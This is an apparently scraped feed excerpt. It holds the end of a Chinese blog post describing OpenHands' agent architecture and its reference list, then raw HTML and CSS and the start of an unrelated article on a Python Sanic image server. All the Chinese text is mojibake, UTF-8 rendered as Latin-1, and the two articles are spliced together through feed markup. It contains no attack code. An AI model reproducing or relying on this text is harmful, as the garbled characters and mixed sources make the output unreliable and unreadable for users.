<p>OpenHandsé‡‡ç”¨äº†ä¸€ç§åŸºäºäº‹ä»¶çš„æ¶æ„ï¼Œå°†Agentã€è¿è¡Œæ—¶ç¯å¢ƒå’Œç”¨æˆ·ç•Œé¢è§£è€¦ï¼Œå®ç°çµæ´»çš„äº¤äº’æ¨¡å¼ã€‚OpenHands çš„å…³é”®ç±»åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p><strong>LLM</strong>ï¼šè´Ÿè´£ä¸å¤§å‹è¯­è¨€æ¨¡å‹çš„æ‰€æœ‰äº¤äº’ã€‚ç”±äº LiteLLM çš„æ”¯æŒï¼Œå®ƒå¯ä»¥ä¸ä»»ä½•åº•å±‚å®Œæˆæ¨¡å‹ä¸€èµ·å·¥ä½œã€‚</p>
</li>
<li>
<p><strong>Agent</strong>ï¼šè´Ÿè´£æŸ¥çœ‹å½“å‰çŠ¶æ€ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªåŠ¨ä½œï¼Œä½¿ç›®æ ‡æ›´è¿›ä¸€æ­¥æ¥è¿‘æœ€ç»ˆç›®æ ‡ã€‚</p>
</li>
<li>
<p><strong>AgentController</strong>ï¼šåˆå§‹åŒ– Agentï¼Œç®¡ç†çŠ¶æ€ï¼Œå¹¶é©±åŠ¨ä¸»è¦å¾ªç¯ï¼Œä¸€æ­¥æ­¥æ¨åŠ¨ Agent å‰è¿›ã€‚</p>
</li>
<li>
<p><strong>State</strong>ï¼šä»£è¡¨ Agent ä»»åŠ¡çš„å½“å‰çŠ¶æ€ã€‚åŒ…æ‹¬å½“å‰æ­¥éª¤ã€æœ€è¿‘äº‹ä»¶çš„å†å²è®°å½•ã€Agentçš„é•¿æœŸè®¡åˆ’ç­‰ã€‚State æ¨¡å—å°±åƒ Agent çš„ â€œè®°å¿†å¤§è„‘â€ï¼Œä¸ä»…èƒ½è®°ä¸‹ä»»åŠ¡æ‰§è¡Œä¸­çš„å„ç§çŠ¶æ€æ•°æ®ï¼Œè¿˜æ”¯æŒæ–­ç‚¹æ¢å¤ï¼Œé•¿å‘¨æœŸä»»åŠ¡å°±ç®—ä¸­æ–­äº†ï¼Œä¹Ÿèƒ½æ¥ç€ä¹‹å‰çš„è¿›åº¦ç»§ç»­åšï¼Œä¸ç”¨ä»å¤´å†æ¥ã€‚</p>
</li>
<li>
<p><strong>EventStream</strong>ï¼šäº‹ä»¶çš„ä¸­å¿ƒæ¢çº½ï¼Œä»»ä½•ç»„ä»¶éƒ½å¯ä»¥å‘å¸ƒäº‹ä»¶ï¼Œæˆ–ç›‘å¬å…¶ä»–ç»„ä»¶å‘å¸ƒçš„äº‹ä»¶ã€‚</p>
<ul>
<li>
<p><strong>Event</strong>ï¼šåŠ¨ä½œæˆ–è§‚å¯Ÿ</p>
<ul>
<li><strong>Action</strong>ï¼šä»£è¡¨ä¸€ä¸ªè¯·æ±‚ï¼Œä¾‹å¦‚ç¼–è¾‘æ–‡ä»¶ã€è¿è¡Œå‘½ä»¤æˆ–å‘é€æ¶ˆæ¯ã€‚</li>
<li><strong>Observation</strong>ï¼šä»£è¡¨ä»ç¯å¢ƒä¸­æ”¶é›†çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ–‡ä»¶å†…å®¹æˆ–å‘½ä»¤è¾“å‡ºã€‚</li>
</ul>
</li>
<li>
<p>Action å’Œ Observation ç›¸å½“äºç»„ä»¶é—´çš„ â€œé€šç”¨è¯­è¨€â€â€”â€”Action å¸¦ç€è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼ŒObservation ä¼ å›æ‰§è¡Œçš„ç»“æœï¼Œä¿©è€…é…åˆåˆ°ä½ï¼Œä¿¡æ¯ä¼ é€’æ‰é¡ºç•…ä¸å¡å£³ã€‚è¿™äº›æ¨¡å—ä¸æ˜¯å„å¹²å„çš„ï¼Œè€Œæ˜¯é  Event Stream è¿™ä¸ª â€œæ ¸å¿ƒæ¢çº½â€ è¿åœ¨ä¸€èµ·ååŒå·¥ä½œ â€”â€” å„ç§äº‹ä»¶éƒ½åœ¨è¿™é‡Œæ±‡èšã€åˆ†å‘ï¼Œæ¨ç€ä»»åŠ¡æŒ‰è®¡åˆ’ä¸€æ­¥æ­¥èµ°ï¼Œæœ€ç»ˆè®© AI Agentæœ‰èƒ½åŠ›å¤„ç†å¤æ‚ä»»åŠ¡ã€‚</p>
</li>
<li>
<p>ReAct èŒƒå¼å°±åƒæ˜¯ Agent çš„ â€œè¡Œä¸ºå‡†åˆ™â€ï¼Œå®šä¸‹äº† â€œå…ˆæ€è€ƒã€å†è¡ŒåŠ¨ã€æ”¶åé¦ˆâ€ çš„æ ¸å¿ƒé€»è¾‘ï¼Œç¡®ä¿å®ƒåšå†³ç­–æ—¶æœ‰æ¡ç†ã€ä¸æ··ä¹±ã€‚äº‹ä»¶é©±åŠ¨æ¨¡å‹åˆ™æ­èµ·äº†ç³»ç»Ÿçš„ â€œéª¨æ¶â€ï¼Œæ‰€æœ‰äº¤äº’éƒ½é äº‹ä»¶æµè½¬æ¥æ¨è¿›ï¼Œå„ä¸ªæ¨¡å—ä¸ç”¨ç¡¬ç»‘åœ¨ä¸€èµ·ï¼Œèƒ½çµæ´»åº”å¯¹å„ç§æƒ…å†µã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>Runtime</strong>ï¼šè´Ÿè´£æ‰§è¡ŒåŠ¨ä½œï¼Œå¹¶å‘é€å›è§‚å¯Ÿç»“æœã€‚</p>
<ul>
<li><strong>Sandbox</strong>ï¼šè¿è¡Œå‘½ä»¤çš„è¿è¡Œæ—¶ç¯å¢ƒéƒ¨åˆ†ï¼Œä¾‹å¦‚åœ¨ Docker å†…éƒ¨ã€‚</li>
<li>Runtime å’Œ Memory è¿™äº›ç»„ä»¶æ˜¯ç³»ç»Ÿçš„å…³é”® â€œå™¨å®˜â€ï¼šRuntime ä¼šæä¾›ä¸€ä¸ªéš”ç¦»çš„æ‰§è¡Œç¯å¢ƒï¼Œä¿è¯ä»£ç è¿è¡Œæ—¶å®‰å…¨åˆç¨³å®šï¼Œä¸ä¼šæä¹±å…¶ä»–éƒ¨åˆ†ï¼›Memory åˆ™æŠŠå†å²æ•°æ®ç®¡å¾—æ˜æ˜ç™½ç™½ï¼Œç»™ Agent åšå†³ç­–æä¾›è¿‡å¾€ç»éªŒã€‚</li>
</ul>
</li>
<li>
<p><strong>Server</strong>ï¼šé€šè¿‡ HTTP ç®¡ç† OpenHands ä¼šè¯ï¼Œä¾‹å¦‚é©±åŠ¨å‰ç«¯ã€‚</p>
<ul>
<li><strong>Session</strong>ï¼šä¿å­˜å•ä¸ª EventStreamã€å•ä¸ª AgentController å’Œå•ä¸ª Runtimeã€‚é€šå¸¸ä»£è¡¨ä¸€ä¸ªå•ä¸€ä»»åŠ¡ï¼ˆä½†å¯èƒ½åŒ…æ‹¬å‡ ä¸ªç”¨æˆ·æç¤ºï¼‰ã€‚</li>
<li><strong>ConversationManager</strong>ï¼šç»´æŠ¤ä¸€ä¸ªæ´»åŠ¨ä¼šè¯åˆ—è¡¨ï¼Œå¹¶ç¡®ä¿è¯·æ±‚è¢«è·¯ç”±åˆ°æ­£ç¡®çš„ä¼šè¯ã€‚</li>
</ul>
</li>
</ul>
<p>æ ¸å¿ƒç»„ä»¶äº¤äº’å…³ç³»å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b429c27dcc1a402a97f3e1f30be19f4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769433231&amp;x-signature=MDZTJJA8bynUXkh9gEBZhDAxE9Y%3D" alt="OpenHands-æ ¸å¿ƒç»„ä»¶äº¤äº’å…³ç³»" loading="lazy"/></p>
<p>OpenHands-æ ¸å¿ƒç»„ä»¶äº¤äº’å…³ç³»</p>
<p>è¿™ä¸ªæµç¨‹å±•ç¤ºäº† OpenHands ä½œä¸ºä¸€ä¸ª AI è½¯ä»¶å¼€å‘Agentå¹³å°çš„å®Œæ•´æ¶æ„ï¼Œä»ç”¨æˆ·äº¤äº’åˆ°æ ¸å¿ƒæ‰§è¡Œçš„å®Œæ•´æ•°æ®æµå’Œç»„ä»¶å…³ç³»ã€‚</p>
<ol>
<li>
<p>ç”¨æˆ·è¾“å…¥é˜¶æ®µ</p>
<ol>
<li>ç”¨æˆ·é€šè¿‡ Web ç•Œé¢ã€CLI æˆ– API å‘èµ·è¯·æ±‚</li>
<li>æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚å¹¶åˆ›å»ºä¼šè¯</li>
<li>äº‹ä»¶é€šè¿‡äº‹ä»¶æµç³»ç»Ÿä¼ é€’</li>
</ol>
</li>
<li>
<p>Agent å¤„ç†é˜¶æ®µ</p>
<ol>
<li>Controller æ ¹æ®é…ç½®åˆå§‹åŒ–ç›¸åº” Agent</li>
<li>Agent åŸºäºå½“å‰çŠ¶æ€å’Œå†å²ç”Ÿæˆå†³ç­–</li>
<li>é€šè¿‡å·¥å…·ç³»ç»Ÿæ‰§è¡Œå…·ä½“æ“ä½œ</li>
</ol>
</li>
<li>
<p>æ‰§è¡Œé˜¶æ®µ</p>
<ol>
<li>Runtime ç¯å¢ƒæ‰§è¡Œå…·ä½“å‘½ä»¤æˆ–ä»£ç </li>
<li>æ’ä»¶ç³»ç»Ÿæä¾›é¢å¤–åŠŸèƒ½æ”¯æŒ</li>
<li>å®‰å…¨ç³»ç»Ÿç›‘æ§æ‰§è¡Œè¿‡ç¨‹</li>
</ol>
</li>
<li>
<p>åé¦ˆé˜¶æ®µ</p>
<ol>
<li>æ‰§è¡Œç»“æœä½œä¸º Observation è¿”å›</li>
<li>æ›´æ–° Agent çŠ¶æ€å’Œè®°å¿†</li>
<li>å°†ç»“æœè¿”å›ç»™ç”¨æˆ·</li>
</ol>
</li>
</ol>
<h3 data-id="heading-14">0xFF å‚è€ƒ</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.all-hands.dev%2Fopenhands%2Fusage%2Farchitecture%2Fbackend" target="_blank" title="https://docs.all-hands.dev/openhands/usage/architecture/backend" ref="nofollow noopener noreferrer">docs.all-hands.dev/openhands/uâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1936485868761257658" target="_blank" title="https://zhuanlan.zhihu.com/p/1936485868761257658" ref="nofollow noopener noreferrer">å½“AI Agentä»â€œç©å…·â€èµ°å‘â€œå·¥å…·â€ï¼Œæˆ‘ä»¬è¯¥å…³æ³¨ä»€ä¹ˆï¼ŸOpenhandsæ¶æ„è§£æã€ç¬¬äºŒç¯‡ï¼šAgent ç›¸å…³æ ¸å¿ƒæ¦‚å¿µã€‘</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fdreamrenderx" target="_blank" title="https://www.zhihu.com/people/dreamrenderx" ref="nofollow noopener noreferrer">å…‹é‡Œ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1936175201323825087" target="_blank" title="https://zhuanlan.zhihu.com/p/1936175201323825087" ref="nofollow noopener noreferrer">å½“AI Agentä»â€œç©å…·â€èµ°å‘â€œå·¥å…·â€ï¼Œæˆ‘ä»¬è¯¥å…³æ³¨ä»€ä¹ˆï¼ŸOpenhandsæ¶æ„è§£æã€ç¬¬ä¸€ç¯‡ï¼šç³»åˆ—å¯¼è¯»ã€‘</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fdreamrenderx" target="_blank" title="https://www.zhihu.com/people/dreamrenderx" ref="nofollow noopener noreferrer">å…‹é‡Œ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1940436682949244630" target="_blank" title="https://zhuanlan.zhihu.com/p/1940436682949244630" ref="nofollow noopener noreferrer">Coding Agentä¹‹Openhandsè§£æ(å«ä»£ç )</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fwu-long-ming-cha-56" target="_blank" title="https://www.zhihu.com/people/wu-long-ming-cha-56" ref="nofollow noopener noreferrer">Arrow</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1940824548485347192" target="_blank" title="https://zhuanlan.zhihu.com/p/1940824548485347192" ref="nofollow noopener noreferrer">OpenHands æºç è§£è¯»</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fxiao-hui-66-72" target="_blank" title="https://www.zhihu.com/people/xiao-hui-66-72" ref="nofollow noopener noreferrer">ä¸€åŠ›è¾‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1968688671378093192" target="_blank" title="https://zhuanlan.zhihu.com/p/1968688671378093192" ref="nofollow noopener noreferrer">ã€Agentå·¥ç¨‹ã€‘01-Agentå·¥ç¨‹æŠ€æœ¯æ´å¯Ÿã€æŒ‘æˆ˜ä»¥åŠè§£å†³æ–¹æ¡ˆ</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fwldandan" target="_blank" title="https://www.zhihu.com/people/wldandan" ref="nofollow noopener noreferrer">ç‹ç£Š</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering%2Fbuilding-effective-agents" target="_blank" title="https://www.anthropic.com/engineering/building-effective-agents" ref="nofollow noopener noreferrer">Building effective agents</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F-BvGnwEbgrFknZ6I-pYfjw" target="_blank" title="https://mp.weixin.qq.com/s/-BvGnwEbgrFknZ6I-pYfjw" ref="nofollow noopener noreferrer">ä»ä»£ç ç”Ÿæˆåˆ°è‡ªä¸»å†³ç­–ï¼šæ‰“é€ ä¸€ä¸ªCodingé©±åŠ¨çš„â€œè‡ªæˆ‘ç¼–ç¨‹â€Agent</a> é˜¿é‡Œäº‘å¼€å‘è€…</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1951318616042631326" target="_blank" title="https://zhuanlan.zhihu.com/p/1951318616042631326" ref="nofollow noopener noreferrer">ä» Prompt åˆ° Contextï¼šåŸºäº 1400+ è®ºæ–‡çš„ Context Engineering ç³»ç»Ÿç»¼è¿°</a> é˜¿é‡Œäº‘å¼€å‘è€…</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1948375162039804773" target="_blank" title="https://zhuanlan.zhihu.com/p/1948375162039804773" ref="nofollow noopener noreferrer">Claude Code æ·±åº¦æ‹†è§£ï¼šä¸€ä¸ªé¡¶çº§AIç¼–ç¨‹å·¥å…·çš„æ ¸å¿ƒæ¶æ„</a> é˜¿é‡Œäº‘å¼€å‘è€…</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzk0MjIwODQ2NA%3D%3D%26mid%3D2247485335%26idx%3D1%26sn%3D2966d272496d757696401d0b27b7a97a%26chksm%3Dc39a89bf69181b5351ee005d9915f4421191b6eb9b8d7833bf5a20eebc74772114da3f41133a%26mpshare%3D1%26scene%3D1%26srcid%3D11156OroWY1YJfDyRmvO25A5%26sharer_shareinfo%3D4415f8a41c58f4e4f12e4cedde93066e%26sharer_shareinfo_first%3D4415f8a41c58f4e4f12e4cedde93066e%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzk0MjIwODQ2NA==&amp;mid=2247485335&amp;idx=1&amp;sn=2966d272496d757696401d0b27b7a97a&amp;chksm=c39a89bf69181b5351ee005d9915f4421191b6eb9b8d7833bf5a20eebc74772114da3f41133a&amp;mpshare=1&amp;scene=1&amp;srcid=11156OroWY1YJfDyRmvO25A5&amp;sharer_shareinfo=4415f8a41c58f4e4f12e4cedde93066e&amp;sharer_shareinfo_first=4415f8a41c58f4e4f12e4cedde93066e#rd" ref="nofollow noopener noreferrer">ä»æ€è€ƒåˆ°è¡ŒåŠ¨ï¼šæ·±åº¦è§£æç±»Manus AI Agentæ¶æ„è®¾è®¡ä¸æœªæ¥æ¼”è¿›</a> AnthroTech AI</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F703618853" target="_blank" title="https://zhuanlan.zhihu.com/p/703618853" ref="nofollow noopener noreferrer">AIç¨‹åºå‘˜ä¹‹OpenDevinæºç å‰–æ</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fzheng-guo-hua-82" target="_blank" title="https://www.zhihu.com/people/zheng-guo-hua-82" ref="nofollow noopener noreferrer">goofy</a></p>
<p>The OpenHands Software Agent SDK: A Composable and Extensible Foundation for Production Agents 2511.03690v1</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fassets.jimmysong.io%2Fbooks%2Fmachine-learning-systems-zh-20251023.pdf" target="_blank" title="https://assets.jimmysong.io/books/machine-learning-systems-zh-20251023.pdf" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ç³»ç»Ÿæ•™ç¨‹ AI â¼¯ç¨‹åŸç†ä¸å®è·µ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxindoo%2Fagentic-design-patterns" target="_blank" title="https://github.com/xindoo/agentic-design-patterns" ref="nofollow noopener noreferrer">Agentic Design Patternsï¼ˆä¸­æ–‡ç¿»è¯‘é¡¹ç›®ï¼‰</a></p>
<p>AIåŸç”Ÿåº”ç”¨æ¶æ„ç™½çš®ä¹¦</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1977044815716832440" target="_blank" title="https://zhuanlan.zhihu.com/p/1977044815716832440" ref="nofollow noopener noreferrer">2025å¿…çœ‹ç³»åˆ—ï¼šAIå¦‚ä½•é‡æ–°å®šä¹‰ç ”ç©¶ï¼Ÿä¸‡å­—é•¿æ–‡è®²é€ã€ŒDeep Researchã€</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1975514242754049684" target="_blank" title="https://zhuanlan.zhihu.com/p/1975514242754049684" ref="nofollow noopener noreferrer">Agentå¼€å‘å®è·µï¼šä»æƒ³æ³•åˆ°äº§å“â€”â€”SSEã€ä¸Šä¸‹æ–‡å·¥ç¨‹ä¸æµå¼è§£æå…³é”®æŠ€æœ¯æ”»åš</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1976305837011116648" target="_blank" title="https://zhuanlan.zhihu.com/p/1976305837011116648" ref="nofollow noopener noreferrer">æ·±å…¥AI Agentå†…æ ¸ï¼šGoogle gemini-cli æºç æ·±åº¦è§£æ„</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1975511012347249929" target="_blank" title="https://zhuanlan.zhihu.com/p/1975511012347249929" ref="nofollow noopener noreferrer">Agentå¼€å‘å®è·µï¼šä»æƒ³æ³•åˆ°äº§å“â€”â€”ç³»ç»Ÿæ¶æ„è®¾è®¡å®è·µ</a></p>
<p>æœ¬æ–‡ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> æ’ç‰ˆ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºé«˜æ€§èƒ½å¼‚æ­¥å›¾ç‰‡æœåŠ¡å™¨ï¼šä»æ‰å¹³å­˜å‚¨åˆ°å“ˆå¸Œåˆ†ç‰‡]]></title>    <link>https://juejin.cn/post/7596926832912662591</link>    <guid>https://juejin.cn/post/7596926832912662591</guid>    <pubDate>2026-01-19T12:39:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596926832912662591" data-draft-id="7593240931287433268" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºé«˜æ€§èƒ½å¼‚æ­¥å›¾ç‰‡æœåŠ¡å™¨ï¼šä»æ‰å¹³å­˜å‚¨åˆ°å“ˆå¸Œåˆ†ç‰‡"/> <meta itemprop="keywords" content="Python,åç«¯"/> <meta itemprop="datePublished" content="2026-01-19T12:39:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºé«˜æ€§èƒ½å¼‚æ­¥å›¾ç‰‡æœåŠ¡å™¨ï¼šä»æ‰å¹³å­˜å‚¨åˆ°å“ˆå¸Œåˆ†ç‰‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T12:39:54.000Z" title="Mon Jan 19 2026 12:39:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    21
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ„å»ºå›¾ç‰‡ä¸Šä¼ ä¸å¤„ç†æœåŠ¡æ—¶ï¼Œéšç€æ–‡ä»¶æ•°é‡ä»å‡ ä¸‡å¢é•¿åˆ°åƒä¸‡çº§åˆ«ï¼ŒåŸå§‹çš„â€œæ‰å¹³åŒ–å­˜å‚¨â€å’Œâ€œåŒæ­¥å¤„ç†â€æ¨¡å¼ä¼šè¿…é€Ÿé‡åˆ°ç“¶é¢ˆã€‚æœ¬æ–‡æ€»ç»“äº†ä¸€å¥—åŸºäº Python (Sanic) çš„é«˜æ€§èƒ½å›¾ç‰‡æœåŠ¡é‡æ„æ–¹æ¡ˆï¼Œæ¶µç›–äº†<strong>å¼‚æ­¥ I/O</strong>ã€<strong>å“ˆå¸Œåˆ†ç‰‡å­˜å‚¨</strong>ã€<strong>æ— é˜»å¡è®¡ç®—</strong>ä»¥åŠ<strong>å‰åç«¯ååŒ</strong>çš„å…¨é“¾è·¯ä¼˜åŒ–ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ æ ¸å¿ƒç—›ç‚¹</h2>
<p>åœ¨é‡æ„ä¹‹å‰ï¼Œç³»ç»Ÿå­˜åœ¨ä»¥ä¸‹ä¸»è¦é—®é¢˜ï¼š</p>
<ol>
<li><strong>æ–‡ä»¶ç³»ç»Ÿç“¶é¢ˆ</strong>ï¼šæ‰€æœ‰æ–‡ä»¶å­˜æ”¾åœ¨åŒä¸€ä¸ªæ ¹ç›®å½•ä¸‹ï¼Œå¯¼è‡´ <code>inode</code> æŸ¥æ‰¾å˜æ…¢ï¼Œ<code>os.listdir</code> ç­‰æ“ä½œåœ¨æ–‡ä»¶æ•°è¿‡ç™¾ä¸‡æ—¶ä¼šæ¶ˆè€—å·¨å¤§å†…å­˜å¹¶é˜»å¡ç³»ç»Ÿã€‚</li>
